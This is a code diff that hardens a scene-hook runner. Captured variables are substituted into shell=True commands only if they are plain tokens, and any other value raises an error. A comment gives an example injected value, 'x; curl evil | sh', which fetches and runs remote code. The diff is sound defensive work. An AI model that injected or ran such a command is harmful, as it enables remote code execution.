@@ -33,6 +33,7 @@ Ids a hook mints are not bound as variables — capture them on camera with a
 """
 from __future__ import annotations
 
+import re
 import subprocess
 import time
 from pathlib import Path
@@ -65,6 +66,24 @@ def normalize_hook(hook: Any) -> dict | None:
     return {"command": command, "timeout_seconds": timeout}
 
 
+# A `${var}` in a hook command is substituted raw into a `shell=True` string, and `capture`
+# actions fill variables with text read off the app under test, which its users may have typed.
+# A value is only substituted if it is a plain token (ids, slugs, urls, numbers); anything with a
+# shell metacharacter or whitespace fails the hook instead of running `x; curl evil | sh`.
+_HOOK_VAR_RE = re.compile(r"\$\{([A-Za-z_][A-Za-z0-9_]*)\}")
+_SAFE_HOOK_VALUE = re.compile(r"[A-Za-z0-9._:/@%+=,~-]*")
+
+
+def _refuse_unsafe_values(command: str, variables: dict, scene_index) -> None:
+    for name in _HOOK_VAR_RE.findall(command):
+        if name in variables and not _SAFE_HOOK_VALUE.fullmatch(str(variables[name])):
+            raise SceneHookError(
+                f"scene {scene_index} `before:` would substitute ${{{name}}} = "
+                f"{str(variables[name])[:60]!r} into a shell command; only plain tokens "
+                "(letters, digits, . _ : / @ % + = , ~ -) are substituted into hooks"
+            )
+
+
 def run_scene_hook(
     hook: Any,
     *,
@@ -85,6 +104,7 @@ def run_scene_hook(
         return None
     command = spec["command"]
     if resolve is not None:
+        _refuse_unsafe_values(command, variables or {}, scene_index)
         command = resolve(command, dict(variables or {}))
     if "${" in command:
         raise SceneHookError(
